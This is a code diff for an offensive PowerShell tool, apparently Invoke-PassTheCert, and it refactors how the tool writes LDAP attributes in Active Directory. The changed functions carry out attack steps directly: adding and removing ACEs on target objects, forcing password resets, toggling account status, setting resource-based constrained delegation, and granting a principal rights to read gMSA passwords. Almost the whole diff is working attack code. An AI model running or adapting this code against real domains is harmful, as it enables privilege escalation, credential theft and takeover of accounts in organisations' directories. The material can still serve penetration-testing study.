@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______| "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|          "
     Write-Host -ForegroundColor Red     ""
-    Write-Host -ForegroundColor Red     "   v1.5.5 "
+    Write-Host -ForegroundColor Red     "   v1.5.6 "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _     "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |    "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_   "
@@ -8097,6 +8097,8 @@ function _Filter {
                     
                     'useraccountcontrol' { $AddMember = $true; $NewMember = _Helper-GetUACFlagsOfValue -Value $Property.Value }
                     
+                    'ntsecuritydescriptor' { $AddMember = $true; $NewMember = _Helper-GetReadableValueOfBytes -Type 'ntsecuritydescriptor' -ArrayOfBytes $Property.Value }
+
                     'objectsid' { $AddMember = $true; $NewMember = _Helper-GetReadableValueOfBytes -Type 'objectsid' -ArrayOfBytes $Property.Value }
 
                     'objectguid' { $AddMember = $true; $NewMember = _Helper-GetReadableValueOfBytes -Type 'objectguid' -ArrayOfBytes $Property.Value }
@@ -9118,16 +9120,7 @@ function _CreateInboundACE {
         
         $NewSD = New-Object byte[] $SD.BinaryLength
         $SD.GetBinaryForm($NewSD, 0)
-
-        $LdapConnection.SendRequest(
-            (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-                $TargetDN,
-                [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
-                'nTSecurityDescriptor',
-                $NewSD
-            ))
-        ) |Out-Null
-
+        _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'nTSecurityDescriptor' -Value ($NewSD)
         Write-Host "[+] Successfully Created Inbound ACE $ACEString Provided To Principal '$IdentitySID' Towards '$TargetDN' !"
         
         # Some ACEs doesn't have 'ObjectAceType' attribute (e.g. 'GenericAll'), hence being set to None.
@@ -9337,16 +9330,7 @@ function _DeleteInboundACE {
         $SD.DiscretionaryAcl.RemoveAce($ACEIndex) |Out-Null
         $NewSD = New-Object byte[] $SD.BinaryLength
         $SD.GetBinaryForm($NewSD, 0)
-
-        $LdapConnection.SendRequest(
-            (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-                $TargetDN, 
-                [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
-                'nTSecurityDescriptor', 
-                $NewSD
-            ))
-        ) |Out-Null
-        
+        _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'nTSecurityDescriptor' -Value ($NewSD)
         Write-Host "[+] Successfully Deleted Inbound ACE $ACEString Provided To Principal '$IdentitySID' Towards '$TargetDN' !"
         #Write-Verbose "[*] Remaining Inbound ACEs Provided To Principal '$IdentitySID' Towards '$TargetDN' Are:`r`n$(_GetInboundACEs -LdapConnection $LdapConnection -Object $TargetDN | Where-Object { $ACE.SecurityIdentifier -eq $IdentitySID } |Out-String)"
     }
@@ -9532,7 +9516,7 @@ function _CreateInboundSDDL {
 
             - Given that the principal is provided via its SID, no lookup is performed, and the SDDL's ACE is deleted with the SID as is. For instance, 'S-1-1-0' is the well-known SID for `Everyone`, hence it can't be looked up via an DN, and must be specified by its SID directly.
 
-        .LINK
+        .LINK   
 
             https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection
 
@@ -9672,16 +9656,7 @@ function _CreateInboundSDDL {
     )
     $NewSD = New-Object byte[] $SD.BinaryLength
     $SD.GetBinaryForm($NewSD, 0)
-
-    $LdapConnection.SendRequest(
-        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-            $TargetDN, 
-            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
-            'nTSecurityDescriptor', 
-            $NewSD
-        ))
-    ) |Out-Null
-
+    _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'nTSecurityDescriptor' -Value ($NewSD)
     Write-Host "[+] Successfully Inserted SDDL ACE String '$ACEString' For Principal '$IdentitySID', Targeting $TargetString !"
     Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundSDDLs' -LdapConnection `$LdapConnection -Object '$TargetDN' |%{(`$_ -replace '\(',`"``n  `" -replace '\)','').Split(`"``n`") } |Select-String -Pattern '$SIDString`$'"
 
@@ -9756,17 +9731,8 @@ function _UpdatePasswordOfIdentity {
     )
     
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
-
     Write-Verbose "[*] Updating Password Of Account '$IdentityDN'..."
-
-    $LdapConnection.SendRequest(
-        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-            $IdentityDN, 
-            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "unicodePwd", 
-            [System.Text.Encoding]::Unicode.GetBytes("`"$NewPassword`"")
-        ))
-    ) |Out-Null
-    
+    _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'unicodePwd' -Value ([System.Text.Encoding]::Unicode.GetBytes("`"$NewPassword`""))
     Write-Host "[+] Successfully Updated Password Of '$IdentityDN' To: $NewPassword"
     return
 }
@@ -10316,39 +10282,27 @@ function _EnableAccount {
 
     $SearchResponse = $LdapConnection.SendRequest(
         (New-Object System.DirectoryServices.Protocols.SearchRequest(
-            $IdentityDN, 
+            $IdentityDN,
             '(objectClass=person)', 
             [System.DirectoryServices.SearchScope]::Base
         ))
     )
 
-    if ($SearchResponse.Entries.Count -eq 0) {
-        return "[!] Account '$IdentityDN' Not Found :( (Either Inexistent, Or Not Of Class 'person') !"
+    [System.Int32]$UAC = _Helper-GetValueOfUACFlags -UACFlags (
+        (_Filter -LdapConnection $LdapConnection -SearchBase $IdentityDN -SearchScope 'Base' -Properties 'userAccountControl').useraccountcontrol
+    )
+    [System.Int32]$AccountDisabled = 0x0002;
+
+    # If the account is disabled,
+    if (($UAC -band $AccountDisabled) -gt 0) {
+        # Enable it (i.e. bitwise AND with NOT flag)
+        $UAC = $UAC -band (-bnot $AccountDisabled)
+        _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'userAccountControl' -Value $UAC.ToString()
+        Write-Host "[+] Successfully Enabled Account '$IdentityDN' !"
     } else {
-        [System.Int32]$UAC = [System.Int32]($SearchResponse.Entries[0].Attributes["userAccountControl"][0].ToString())
-        [System.Int32]$AccountDisabled = 0x0002;
-
-        # If the account is disabled, 
-        if (($UAC -band $AccountDisabled) -gt 0) {
-            # Enable it (i.e. bitwise AND with NOT flag)
-            $UAC = $UAC -band (-bnot $AccountDisabled)
-            $LdapConnection.SendRequest(
-                (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-                    $IdentityDN, 
-                    [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
-                    "userAccountControl", 
-                    $UAC.ToString()
-                ))
-            ) |Out-Null
-
-            Write-Host "[+] Successfully Enabled Account '$IdentityDN' !"
-            return
-        }
-        else {
-            Write-Host "[!] Account '$IdentityDN' Is Already Enabled !"
-            return
-        }
+        Write-Host "[!] Account '$IdentityDN' Is Already Enabled !"
     }
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'ShowStatusOfAccount' -LdapConnection `$LdapConnection -Identity '$IdentityDN'"
 }
 
 
@@ -10408,43 +10362,21 @@ function _DisableAccount {
 
     Write-Verbose "[*] Disabling Account '$IdentityDN'..."
 
-    $SearchResponse = $LdapConnection.SendRequest(
-        (New-Object System.DirectoryServices.Protocols.SearchRequest(
-            $IdentityDN, 
-            '(objectClass=person)', 
-            [System.DirectoryServices.SearchScope]::Base
-        ))
+    [System.Int32]$UAC = _Helper-GetValueOfUACFlags -UACFlags (
+        (_Filter -LdapConnection $LdapConnection -SearchBase $IdentityDN -SearchScope 'Base' -Properties 'userAccountControl').useraccountcontrol
     )
+    [System.Int32]$AccountDisabled = 0x0002;
 
-
-    if ($SearchResponse.Entries.Count -eq 0) {
-        Write-Host "[!] Account '$IdentityDN' Not Found :( (Either Inexistent, Or Not Of Class 'person') !"
-        return
+    # If the account is enabled
+    if (-not (($UAC -band $AccountDisabled) -gt 0)) {
+        # Disable it (i.e. bitwise OR with FLAG)
+        $UAC = $UAC -bor $AccountDisabled
+        _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'userAccountControl' -Value $UAC.ToString()
+        Write-Host "[+] Successfully Disabled Account '$IdentityDN' !"
     } else {
-        [System.Int32]$UAC = [System.Int32]($SearchResponse.Entries[0].Attributes["userAccountControl"][0].ToString())
-        [System.Int32]$AccountDisabled = 0x0002;
-
-        # If the account is enabled
-        if (-not (($UAC -band $AccountDisabled) -gt 0)) {
-            # Disable it (i.e. bitwise OR with FLAG)
-            $UAC = $UAC -bor $AccountDisabled
-            $LdapConnection.SendRequest(
-                (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-                    $IdentityDN, 
-                    [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
-                    "userAccountControl", 
-                    $UAC.ToString()
-                ))
-            ) |Out-Null
-            
-            Write-Host "[+] Successfully Disabled Account '$IdentityDN' !"
-            return
-        }
-        else {
-            Write-Host "[!] Account '$IdentityDN' Is Already Disabled !"
-            return
-        }
+        Write-Host "[!] Account '$IdentityDN' Is Already Disabled !"
     }
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'ShowStatusOfAccount' -LdapConnection `$LdapConnection -Identity '$IdentityDN'"
 }
 
 
@@ -11122,7 +11054,7 @@ function _LDAPEnum {
                         Add-Member -PassThru -Force -NotePropertyName 'sAMAccountName' -NotePropertyValue $gMSAAccount.samaccountname |
                         Add-Member -PassThru -Force -NotePropertyName 'distinguishedName' -NotePropertyValue $gMSAAccount.distinguishedname
                 } catch {
-                    Write-Host "[!] Reading msDS-ManagedPassword Attribute Of gMSA Account '$($gMSAAccount.samaccountname)' Failed With Error: $_"
+                    Write-Host "[*$Enum*] [!] Reading msDS-ManagedPassword Attribute Of gMSA Account '$($gMSAAccount.samaccountname)' Failed With Error: $_"
                     continue
                 }
             }
@@ -11611,7 +11543,7 @@ function _LDAPExploit {
                 $SDBytes = New-Object byte[] ($SD.BinaryLength)
                 $SD.GetBinaryForm($SDBytes, 0)
 
-                _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Value $SDBytes
+                _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Value ($SDBytes)
 
                 Write-Host "[*$Exploit*] [+] Successfully Set '$TargetDN':'msDS-AllowedToActOnBehalfOfOtherIdentity' Attribute To SID Of '$IdentityDN' !!"
                 Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'RBCD'"
@@ -11658,15 +11590,7 @@ function _LDAPExploit {
                 # Inserting the newly defined msDS-GroupMSAMembership's DACL
                 $NewSD = New-Object byte[] $SD.BinaryLength
                 $SD.GetBinaryForm($NewSD, 0)
-                $LdapConnection.SendRequest(
-                    (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-                        $TargetDN,
-                        [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
-                        'msDS-GroupMSAMembership',
-                        $NewSD
-                    ))
-                ) |Out-Null
-
+                _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'msDS-GroupMSAMembership' -Value ($NewSD)
                 Write-Host "[*$Exploit*] [+] Successfully Allowed '$gMSAMembershipSID' To Read The Password Of gMSA Account '$TargetDN' !"
                 Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'gMSA' -Object '$TargetDN'"
 
